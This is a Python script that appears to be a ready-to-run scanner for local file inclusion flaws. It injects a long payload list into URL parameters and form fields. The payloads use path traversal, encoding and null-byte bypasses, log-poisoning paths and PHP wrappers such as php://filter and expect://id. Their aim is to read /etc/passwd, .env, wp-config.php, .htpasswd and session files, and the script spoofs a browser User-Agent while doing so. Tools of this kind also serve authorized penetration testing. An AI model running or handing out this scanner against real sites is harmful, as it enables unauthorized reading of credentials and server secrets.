import requests
from bs4 import BeautifulSoup
import urllib.parse
import re

# --- CONFIGURATION (user-modifiable) ---
TARGET_URL = "http://example.com/index.php?page=home"  # Target URL to test
TIMEOUT = 5  # Request timeout in seconds
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"  # Mimic a real browser

# LFI payloads (classic, advanced, and filter bypass)
LFI_PAYLOADS = [
    # Classic path traversal
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",

    # URL encoding bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 encoding
    "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoding
    "..%255c..%255c..%255cetc%255cpasswd",  # Windows path (double encoded)

    # Null byte and path truncation
    "../../../../../../../../etc/passwd\0",
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../boot.ini%00",

    # Windows paths
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\boot.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",

    # Log poisoning (common log files)
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../var/log/apache/access.log",
    "../../../../../../../../usr/local/apache/logs/access_log",
    "../../../../../../../../usr/local/apache2/logs/access_log",
    "../../../../../../../../var/www/logs/access_log",
    "../../../../../../../../etc/httpd/logs/access_log",

    # PHP wrappers (for source code disclosure)
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../index.php",

    # Environment variables and PHP info
    "../../../../../../../../proc/self/environ",
    "php://input",
    "expect://id",

    # Configuration files (common web apps)
    "../../../../../../../../var/www/html/config.php",
    "../../../../../../../../var/www/html/wp-config.php",
    "../../../../../../../../var/www/html/configuration.php",
    "../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/php.ini",

    # Git and environment files
    "../../../../../../../../.git/config",
    "../../../../../../../../.env",
    "../../../../../../../../composer.json",

    # Apache/Nginx misconfigurations
    "/.htaccess",
    "/.htpasswd",
    "/server-status",

    # Session and cache files
    "../../../../../../../../var/lib/php/sessions/sess_*",
    "../../../../../../../../tmp/sess_*",
]

# --- FUNCTIONS ---

def test_lfi_in_url(url):
    """Test LFI vulnerabilities in URL parameters."""
    print("\n[+] Testing LFI in URL parameters...")
    try:
        if "?" in url:
            base_url, params = url.split("?", 1)
            for payload in LFI_PAYLOADS:
                encoded_payload = urllib.parse.quote(payload)
                for param in params.split("&"):
                    if "=" in param:
                        key, _ = param.split("=", 1)
                        new_params = params.replace(param, f"{key}={encoded_payload}")
                        test_url = f"{base_url}?{new_params}"
                        try:
                            headers = {"User-Agent": USER_AGENT}
                            r = requests.get(test_url, headers=headers, timeout=TIMEOUT, allow_redirects=False)

                            # Check for common LFI indicators
                            lfi_indicators = [
                                "root:x:",  # /etc/passwd
                                "[boot loader]",  # boot.ini
                                "DB_USERNAME",  # config files
                                "allow_url_include",  # php.ini
                                "SERVER_ADDR",  # /proc/self/environ
                                "PHP_VERSION",  # phpinfo
                                "base64",  # PHP wrapper response
                                "Apache/2.",  # Apache config
                                "nginx/1.",  # Nginx config
                                "wordpress",  # wp-config.php
                            ]

                            if any(indicator in r.text for indicator in lfi_indicators):
                                print(f"[!] Possible LFI vulnerability with: {test_url}")
                                print(f"    [Response snippet] {r.text[:300]}...")
                            else:
                                print(f"[-] No LFI detected with: {payload}")

                        except requests.exceptions.RequestException as e:
                            print(f"[!] Error testing {test_url}: {e}")
        else:
            print("[-] No parameters in URL to test LFI.")
    except Exception as e:
        print(f"[!] Error during LFI URL test: {e}")

def find_forms(url):
    """Find all forms on the page."""
    try:
        headers = {"User-Agent": USER_AGENT}
        r = requests.get(url, headers=headers, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"\n[+] Found {len(forms)} forms on the page.")
        return forms
    except Exception as e:
        print(f"[!] Error finding forms: {e}")
        return []

def test_form(form, url):
    """Extract form details."""
    form_details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    form_details['action'] = action
    form_details['method'] = method
    form_details['inputs'] = inputs
    return form_details

def test_lfi_in_form(form_details, url):
    """Test LFI vulnerabilities in form fields."""
    print("\n[+] Testing LFI in form...")
    target_url = url if form_details['action'].startswith('http') else url + form_details['action']
    for payload in LFI_PAYLOADS:
        data = {}
        for input_tag in form_details['inputs']:
            data[input_tag['name']] = urllib.parse.quote(payload)
        try:
            headers = {"User-Agent": USER_AGENT}
            if form_details['method'] == "post":
                r = requests.post(target_url, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)
            else:
                r = requests.get(target_url, params=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)

            lfi_indicators = [
                "root:x:",
                "[boot loader]",
                "DB_USERNAME",
                "allow_url_include",
                "SERVER_ADDR",
                "PHP_VERSION",
                "base64",
                "Apache/2.",
                "nginx/1.",
                "wordpress",
            ]

            if any(indicator in r.text for indicator in lfi_indicators):
                print(f"[!] Possible LFI vulnerability in form with: {data}")
                print(f"    [Response snippet] {r.text[:300]}...")
            else:
                print(f"[-] No LFI detected with: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing LFI with {payload}: {e}")

# --- EXECUTION ---
if __name__ == "__main__":
    print(f"[*] Starting LFI scan on: {TARGET_URL}")
    test_lfi_in_url(TARGET_URL)
    forms = find_forms(TARGET_URL)
    for form in forms:
        form_details = test_form(form, TARGET_URL)
        test_lfi_in_form(form_details, TARGET_URL)
    print("\n[*] LFI scan completed.")
